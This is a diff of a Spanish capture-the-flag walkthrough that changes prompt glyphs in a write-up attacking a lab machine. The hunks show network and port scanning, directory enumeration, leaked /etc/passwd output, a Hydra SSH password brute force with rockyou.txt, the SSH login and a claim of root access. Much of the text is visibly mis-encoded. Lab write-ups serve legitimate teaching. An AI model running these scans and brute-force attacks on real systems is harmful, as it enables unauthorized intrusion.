@@ -32,7 +32,7 @@ Fecha: 2026-03-04
 Empezaremos con un descubrimiento de *IP* dentro de la red para ver donde se encuentra nuestro objetivo.
 
 ```bash
-¯é░ sudo arp-scan -I eth0 --localnet                                  
+é sudo arp-scan -I eth0 --localnet                                  
 
 Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
@@ -50,10 +50,10 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 1.949 seconds (131.35 hosts/sec). 4
 Vemos que la maquina se encuentra en la direcci├│n **10.0.11.13** as├¡ que empecemos con la enumeraci├│n de puertos.
 
 ```bash
-¯é░ settarget 10.0.11.13            
+é settarget 10.0.11.13            
 TARGET establecido: 10.0.11.13
 
-¯é░ gomap -s $TARGET     
+é gomap -s $TARGET     
 
   ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
  ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
@@ -62,7 +62,7 @@ TARGET establecido: 10.0.11.13
  ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
   ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
 
-­ƒÄ» Scanning 10.0.11.13 (997 ports)
+­ Scanning 10.0.11.13 (997 ports)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u3
@@ -89,7 +89,7 @@ console.log("CastorTech funcionando correctamente");
 Vamos a realizar una enumeraci├│n de directorios a ver si encontramos algo.
 
 ```bash
-¯é░ gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
+é gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -191,7 +191,7 @@ castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
 De este listado vemos un usuario que nos puede servir **castorcin** as├¡ que ahora toca mirar si encontramos la contrase├▒a contra *SSH*.
 
 ```bash
-¯é░ hydra -l castorcin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+é hydra -l castorcin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-04 13:48:06
@@ -205,7 +205,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-04 13:48:
 Ahora con los credenciales toca explorar el servidor para ver que podemos obtener.
 
 ```bash
-¯é░ ssh castorcin@$TARGET
+é ssh castorcin@$TARGET
 The authenticity of host '10.0.11.13 (10.0.11.13)' can't be established.
 ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
 This key is not known by any other names.
@@ -263,3 +263,4 @@ congrats.txt  root.txt
 ```
 
 Y con esto hemos conseguido acceder como **root** al sistema y comprometerlo.
+
